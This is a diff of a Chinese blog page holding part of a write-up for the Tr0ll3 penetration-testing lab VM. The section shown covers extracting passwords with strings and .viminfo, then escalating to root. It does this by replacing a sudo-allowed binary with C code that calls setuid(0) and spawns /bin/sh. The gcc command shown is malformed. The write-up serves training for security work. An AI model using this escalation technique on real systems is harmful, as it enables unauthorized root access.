+<h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings dont_even_bother</span><br></pre></td></tr></table></figure>
+
 <p>strings 命令用于扫描二进制文件（如可执行文件、共享库、目标文件等），并提取其中的可打印字符串。这些字符串可能是程序中的文本、错误消息、调试信息、配置参数等。使用 strings 命令可以帮助分析二进制文件，查找其中的文本内容或敏感信息。</p>
 <p>学到了</p>
-<pre><code>xl8Fpx%6
- Correct Password 
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xl8Fpx%6</span><br><span class="line"> Correct Password </span><br><span class="line"></span><br><span class="line"> Your reward is just knowing you did it! :-P </span><br></pre></td></tr></table></figure>
 
- Your reward is just knowing you did it! :-P 
-</code></pre>
 <p>然后我们ll以下，会发现多了个文件.viminfo，cat一下内容可以发现maleus的密码</p>
-<pre><code>B^slc8I$
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B^slc8I$</span><br></pre></td></tr></table></figure>
+
 <p>sudo -l查看自己可用的权限</p>
-<pre><code>Matching Defaults entries for maleus on Tr0ll3:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for maleus on Tr0ll3:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User maleus may run the following commands on Tr0ll3:</span><br><span class="line">    (root) /home/maleus/dont_even_bother</span><br></pre></td></tr></table></figure>
 
-User maleus may run the following commands on Tr0ll3:
-    (root) /home/maleus/dont_even_bother
-</code></pre>
 <p>提示我们通过个elf文件达到root权限，也快拿到了Tr0ll3的权限了，怎么做呢,我们可以删除这个文件，重新新建一个c文件，返回root的bash</p>
-<pre><code class="bash">rm  /home/maleus/dont_even_bother
-vim /home/maleus/dont_even_bother
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span>  /home/maleus/dont_even_bother</span><br><span class="line">vim /home/maleus/dont_even_bother</span><br></pre></td></tr></table></figure>
+
 <p>然后输入一下代码</p>
-<pre><code class="c">int main(void) &#123;
-        setgid(9);
-        setuid(0);
-        execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);
-&#125;
-gcc dont_even_bother.c -dont_even_bother
-</code></pre>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        setgid(<span class="number">9</span>);</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">gcc dont_even_bother.c -dont_even_bother</span><br></pre></td></tr></table></figure>
+
 <p>因为maleus对这个文件具有root权限，所以可以通过修改这个文件，让他调用系统函数来达到提升权限的目的，然后就是去root目录下找flag了。</p>
-<pre><code>You are truly a Jedi!
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You are truly a Jedi!</span><br><span class="line"></span><br><span class="line">Twitter Proof:</span><br><span class="line"></span><br><span class="line">Pr00fThatTh3L33tHax0rG0tTheFl@g!!</span><br><span class="line"></span><br><span class="line">@Maleus21</span><br></pre></td></tr></table></figure>
 
-Twitter Proof:
-
-Pr00fThatTh3L33tHax0rG0tTheFl@g!!
-
-@Maleus21
-</code></pre>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Youzipii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/28/OSCP-003-Troll/">http://example.com/2024/04/28/OSCP-003-Troll/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">You_zip</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/OSCP/">OSCP</a><a class="post-meta__tags" href="/tags/%E7%9F%AD%E9%93%BE%E6%8E%A5%E8%BF%98%E5%8E%9F/">短链接还原</a><a class="post-meta__tags" href="/tags/tcpdump/">tcpdump</a><a class="post-meta__tags" href="/tags/strings/">strings</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/28/kali-docker-vulhub/" title="kali+docker+vulhub"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">kali+docker+vulhub</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/26/Load-Of-The-Root/" title="Load Of The Root"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Load Of The Root</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/08/04/OSCP-005-Broken/" title="OSCP-005-Broken"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-04</div><div class="title">OSCP-005-Broken</div></div></a></div><div><a href="/2024/08/01/OSCP-004-Matrix/" title="OSCP-004-Matrix"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="title">OSCP-004-Matrix</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youzipii</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/youzipii"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E9%93%BE%E6%8E%A5%E8%BF%98%E5%8E%9F"><span class="toc-text">短链接还原</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcpdump"><span class="toc-text">tcpdump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strings"><span class="toc-text">strings</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/13/%E7%BA%A2%E6%97%A5-day1/" title="红日-day1">红日-day1</a><time datetime="2024-08-13T09:09:24.000Z" title="发表于 2024-08-13 17:09:24">2024-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/12/DC-4/" title="DC-4">DC-4</a><time datetime="2024-08-12T08:46:53.905Z" title="发表于 2024-08-12 16:46:53">2024-08-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/shiro-550-%E7%8E%AF%E5%A2%83/" title="shiro-550-环境">shiro-550-环境</a><time datetime="2024-08-11T10:56:40.000Z" title="发表于 2024-08-11 18:56:40">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/pikachu/" title="pikachu">pikachu</a><time datetime="2024-08-11T02:45:29.000Z" title="发表于 2024-08-11 10:45:29">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/vulhub-tomcat/" title="vulhub-tomcat">vulhub-tomcat</a><time datetime="2024-08-11T02:44:16.000Z" title="发表于 2024-08-11 10:44:16">2024-08-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/bk_image/bg3.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youzipii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Youzipii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/28/OSCP-003-Troll/">http://example.com/2024/04/28/OSCP-003-Troll/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">You_zip</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/OSCP/">OSCP</a><a class="post-meta__tags" href="/tags/%E7%9F%AD%E9%93%BE%E6%8E%A5%E8%BF%98%E5%8E%9F/">短链接还原</a><a class="post-meta__tags" href="/tags/tcpdump/">tcpdump</a><a class="post-meta__tags" href="/tags/strings/">strings</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/28/kali-docker-vulhub/" title="kali+docker+vulhub"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">kali+docker+vulhub</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/26/Load-Of-The-Root/" title="Load Of The Root"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Load Of The Root</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/08/01/OSCP-004-Matrix/" title="OSCP-004-Matrix"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="title">OSCP-004-Matrix</div></div></a></div><div><a href="/2024/08/04/OSCP-005-Broken/" title="OSCP-005-Broken"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-04</div><div class="title">OSCP-005-Broken</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youzipii</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/youzipii"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E9%93%BE%E6%8E%A5%E8%BF%98%E5%8E%9F"><span class="toc-text">短链接还原</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcpdump"><span class="toc-text">tcpdump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strings"><span class="toc-text">strings</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/13/%E7%BA%A2%E6%97%A5-day1/" title="红日-day1">红日-day1</a><time datetime="2024-08-13T09:09:24.000Z" title="发表于 2024-08-13 17:09:24">2024-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/12/DC-4/" title="DC-4">DC-4</a><time datetime="2024-08-12T08:46:53.905Z" title="发表于 2024-08-12 16:46:53">2024-08-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/shiro-550-%E7%8E%AF%E5%A2%83/" title="shiro-550-环境">shiro-550-环境</a><time datetime="2024-08-11T10:56:40.000Z" title="发表于 2024-08-11 18:56:40">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/pikachu/" title="pikachu">pikachu</a><time datetime="2024-08-11T02:45:29.000Z" title="发表于 2024-08-11 10:45:29">2024-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/11/vulhub-tomcat/" title="vulhub-tomcat">vulhub-tomcat</a><time datetime="2024-08-11T02:44:16.000Z" title="发表于 2024-08-11 10:44:16">2024-08-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/bk_image/bg3.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youzipii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
